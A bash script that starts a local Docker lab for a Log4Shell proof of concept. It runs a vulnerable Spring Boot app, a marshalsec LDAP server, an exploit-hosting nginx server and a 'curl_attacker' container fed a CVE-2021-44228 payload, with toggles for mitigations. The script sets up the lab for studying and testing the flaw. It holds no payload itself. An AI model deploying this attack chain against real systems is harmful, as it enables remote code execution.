#!/bin/bash

export $(cat .env | xargs)

echo "Creating containers"

#docker network create -d bridge the_internet

#docker run host -p "8080:8080" --name spring-boot-app --env LOG4J_VERSION=${LOG4J_VERSION} poc:${JAVA_VERSION} &
#docker run host --name marshalsec marshalsec &
#docker run host -p "8888:80" --name exploit-http-server --env LOG4J_VERSION=${LOG4J_VERSION} exploit_nginx &
#docker run host  --name curl_attacker --env PAYLOAD=${PAYLOAD} -v ${PWD}/exploits.sh:/exploits.sh curler

docker run --add-host=host.docker.internal:host-gateway --network=bridge -p "8080:8080" --name spring-boot-app --env LOG4J_VERSION=${LOG4J_VERSION} --env DISABLE_TRUST_URL=${DISABLE_TRUST_URL} --env REMOVE_JNDI_LOOKUP_CLASS=${REMOVE_JNDI_LOOKUP_CLASS}  poc:${JAVA_VERSION} &
docker run --add-host=host.docker.internal:host-gateway --network=bridge -p  "1389:1389" --name marshalsec marshalsec &
docker run --add-host=host.docker.internal:host-gateway --network=bridge -p "8888:80" --name exploit-http-server --env LOG4J_VERSION=${LOG4J_VERSION} exploit_nginx &
docker run --add-host=host.docker.internal:host-gateway --network=bridge  --name curl_attacker --env PAYLOAD=${PAYLOAD_44228} --env TARGET_URI=${TARGET_URI} -v ${PWD}/exploits.sh:/exploits.sh curler

sleep 2